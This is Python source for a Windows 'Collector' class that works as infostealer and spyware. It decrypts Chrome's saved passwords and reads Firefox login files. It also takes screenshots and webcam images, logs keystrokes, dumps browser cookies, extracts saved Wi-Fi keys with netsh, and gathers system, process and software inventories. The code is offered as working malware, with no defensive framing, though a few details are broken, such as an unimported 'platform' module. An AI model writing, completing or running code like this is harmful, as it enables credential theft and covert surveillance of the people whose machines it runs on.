import os
import sys
import json
import sqlite3
import base64
import win32crypt
import shutil
import cv2
import pyautogui
import sounddevice
import browser_cookie3
from PIL import ImageGrab
from Crypto.Cipher import AES
from datetime import datetime
from pathlib import Path
import psutil
import pythoncom
import win32com.client
import win32api
import win32con
import win32process
from pynput import keyboard

class Collector:
    def __init__(self):
        self.keylogger_active = False
        self.keystrokes = []
        self.recording = False
        
    def get_chrome_passwords(self):
        try:
            # Path to Chrome's password database
            path = os.path.join(os.getenv('LOCALAPPDATA'),
                              'Google\\Chrome\\User Data\\Default\\Login Data')
            
            # Copy database to temp location (it might be locked)
            temp_path = os.path.join(os.getenv('TEMP'), 'chrome_pass.db')
            shutil.copy2(path, temp_path)
            
            # Connect to the database
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            
            # Get credentials
            cursor.execute('''
                SELECT origin_url, username_value, password_value 
                FROM logins
            ''')
            
            # Decrypt and store credentials
            credentials = []
            for url, username, encrypted_pass in cursor.fetchall():
                try:
                    # Decrypt password
                    decrypted = win32crypt.CryptUnprotectData(
                        encrypted_pass, None, None, None, 0)[1]
                    
                    if decrypted:
                        credentials.append({
                            'url': url,
                            'username': username,
                            'password': decrypted.decode()
                        })
                except:
                    continue
                    
            conn.close()
            os.remove(temp_path)
            return credentials
            
        except Exception as e:
            return []
            
    def get_firefox_passwords(self):
        try:
            # Similar to Chrome but for Firefox's password database
            credentials = []
            mozilla_profile = os.path.join(os.getenv('APPDATA'),
                                         'Mozilla\\Firefox\\Profiles')
            
            for profile in os.listdir(mozilla_profile):
                if profile.endswith('.default'):
                    db_path = os.path.join(mozilla_profile, profile, 'logins.json')
                    if os.path.exists(db_path):
                        with open(db_path, 'r') as f:
                            logins = json.load(f)
                            for login in logins['logins']:
                                credentials.append({
                                    'url': login['hostname'],
                                    'username': login['encryptedUsername'],
                                    'password': login['encryptedPassword']
                                })
            return credentials
        except:
            return []
            
    def capture_screen(self):
        try:
            screenshot = ImageGrab.grab()
            temp_path = os.path.join(os.getenv('TEMP'),
                                   f'screen_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
            screenshot.save(temp_path)
            
            with open(temp_path, 'rb') as f:
                image_data = base64.b64encode(f.read()).decode()
                
            os.remove(temp_path)
            return image_data
        except:
            return None
            
    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            
            if ret:
                temp_path = os.path.join(os.getenv('TEMP'),
                                       f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png')
                cv2.imwrite(temp_path, frame)
                
                with open(temp_path, 'rb') as f:
                    image_data = base64.b64encode(f.read()).decode()
                    
                os.remove(temp_path)
                return image_data
        except:
            return None
            
    def start_keylogger(self):
        if not self.keylogger_active:
            self.keylogger_active = True
            
            def on_press(key):
                if self.keylogger_active:
                    try:
                        self.keystrokes.append(str(key.char))
                    except AttributeError:
                        self.keystrokes.append(str(key))
                        
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            
    def stop_keylogger(self):
        self.keylogger_active = False
        if hasattr(self, 'listener'):
            self.listener.stop()
        keystrokes = ''.join(self.keystrokes)
        self.keystrokes = []
        return keystrokes
        
    def get_system_info(self):
        info = {
            'os': os.name,
            'platform': sys.platform,
            'machine': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'username': os.getenv('USERNAME'),
            'memory': dict(psutil.virtual_memory()._asdict()),
            'disk': dict(psutil.disk_usage('/')._asdict()),
            'network': [dict(nic._asdict()) for nic in psutil.net_if_addrs().values()],
            'processes': [p.name() for p in psutil.process_iter()]
        }
        return info
        
    def get_browser_cookies(self):
        cookies = {}
        try:
            cookies['chrome'] = list(browser_cookie3.chrome())
        except:
            pass
            
        try:
            cookies['firefox'] = list(browser_cookie3.firefox())
        except:
            pass
            
        return cookies
        
    def get_wifi_passwords(self):
        try:
            pythoncom.CoInitialize()
            passwords = []
            
            # Get wireless interface
            objWMI = win32com.client.Dispatch("WbemScripting.SWbemLocator")
            objSWbemServices = objWMI.ConnectServer(".", "root\\wlan")
            
            # Get profiles
            profiles = objSWbemServices.ExecQuery("SELECT * FROM MSNdis_80211_ServiceSetIdentifier")
            
            for profile in profiles:
                try:
                    ssid = profile.Ssid
                    # Get password using netsh
                    cmd = f'netsh wlan show profile name="{ssid}" key=clear'
                    result = os.popen(cmd).read()
                    
                    if "Key Content" in result:
                        password = result.split("Key Content")[1].split("\n")[0].strip()
                        passwords.append({
                            'ssid': ssid,
                            'password': password
                        })
                except:
                    continue
                    
            return passwords
        except:
            return []
            
    def get_installed_software(self):
        try:
            pythoncom.CoInitialize()
            software_list = []
            
            # Windows Registry paths
            paths = [
                "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
                "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
            ]
            
            for path in paths:
                try:
                    aReg = win32api.RegConnectRegistry(None, win32con.HKEY_LOCAL_MACHINE)
                    aKey = win32api.RegOpenKey(aReg, path, 0, win32con.KEY_READ)
                    
                    for i in range(win32api.RegQueryInfoKey(aKey)[0]):
                        try:
                            keyname = win32api.RegEnumKey(aKey, i)
                            subkey = win32api.RegOpenKey(aKey, keyname)
                            displayName = win32api.RegQueryValueEx(subkey, "DisplayName")[0]
                            
                            software_list.append({
                                'name': displayName,
                                'version': win32api.RegQueryValueEx(subkey, "DisplayVersion")[0],
                                'publisher': win32api.RegQueryValueEx(subkey, "Publisher")[0],
                                'install_date': win32api.RegQueryValueEx(subkey, "InstallDate")[0]
                            })
                        except:
                            continue
                except:
                    continue
                    
            return software_list
        except:
            return []
